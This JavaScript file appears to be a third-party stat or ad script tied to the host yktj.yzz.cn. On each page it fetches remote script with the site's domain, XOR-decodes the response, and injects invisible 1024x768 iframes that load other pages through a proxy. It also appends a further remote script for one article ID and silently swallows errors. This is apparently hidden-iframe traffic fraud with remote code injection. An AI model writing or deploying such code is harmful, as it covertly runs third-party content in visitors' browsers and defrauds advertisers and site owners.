var yktj_click_global = {
	k 	: '',
	pad	: '.',
	data: '',
	getDomain: function(){
		var ooxx = window.location.toString();
		ooxx = ooxx.substr(ooxx.indexOf('//') + 2);
		if( ooxx.indexOf('/') > -1 ){
			ooxx = ooxx.substring(0, ooxx.indexOf('/'));
		}
		
		return ooxx;
	}
};

function yktj_cb(data) { ; }
function yktj_fb(ifrmsrc)
{
	var baseurl = 'http://yktj.yzz.cn/rec.php';
	
	var urlarg = ifrmsrc.split('?').pop().split('&');
	var tmpargs;
	var getGlobalVar = {};
	for (var i in urlarg) {
		tmpargs = urlarg[i].split('=');
		getGlobalVar[tmpargs[0]] = tmpargs.slice(1).join('=');
	}
	
	urlarg = '?callbak=yktj_cb';
	for (var i in getGlobalVar) {
		switch (i) {
			case 'articleid': {
				urlarg += '&pid='+getGlobalVar['articleid'];
				break;
			}
			case 'urluri': {
				urlarg += '&ou='+getGlobalVar['urluri'];
				break;
			}
		}
	}

	if (parseInt(getGlobalVar['articleid']) == 46450) {
		//document.write('<script src="'+ baseurl + urlarg +'&_rnd='+ Math.random() +'"><\/script>');
		var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
		ga.src = baseurl + urlarg +'&_rnd='+ Math.random();
		var s = document.getElementsByTagName('script')[0]; s.parentNode.appendChild(ga);
	}
}

function yktj_handleData(json){
	var data = json.data;
	
	window.onload = function(){
		try{
			var _return = MyDecode(data).split('||||');
			var _rand = _return[1];
			var _count = 0, _Arr_ForADStruct=[], _Arr_TempADPool = [], _Arr_RealADStruct = null;
			var _data =_return[0].split('|||');
			var _div = document.createElement('DIV');
				_div.style.display='none';
			var _html = '';
			for(var _i=0,_n=_data.length;_i<_n;_i++){
				var _dT = _data[_i].match(/(\S)+/gi);
				if(_dT.constructor==Array&&_dT.length>1&&_dT[1])
				{
					var temp = _dT[2].substr(_dT[2].indexOf('?') + 1);
					if( temp.indexOf('%3F') == -1 )
						_html += '<iframe src="http://yktj.yzz.cn/f.php?u='+ escape(_dT[2] + '%3Fd=&s=yh') +'" width="1024" height="768" frameborder="0"></iframe>';	// onload="yktj_fb(this.src)"
					else
						_html += '<iframe src="http://yktj.yzz.cn/f.php?u='+ escape(_dT[2] + '&s=yh') +'" width="1024" height="768" frameborder="0"></iframe>';	// onload="yktj_fb(this.src)"
				}		
			}
			_div.innerHTML = _html;
			document.body.appendChild(_div);
			_div = _dT = _html = null;
			
		}catch(_e){
			
		}
	}
}

function MyDecode(str){
	var i, k, str2="";	
	k = str.split( yktj_click_global.pad );	
	for(i = 0; i < k.length; i++){
		str2 += String.fromCharCode( k[i]^k );
	}
	
	return str2;
}

document.write('<script src="http://yktj.yzz.cn/c/g.php?jsoncallback=yktj_handleData&domain='+ yktj_click_global.getDomain() +'&rnd='+ Math.random() +'"><\/script>');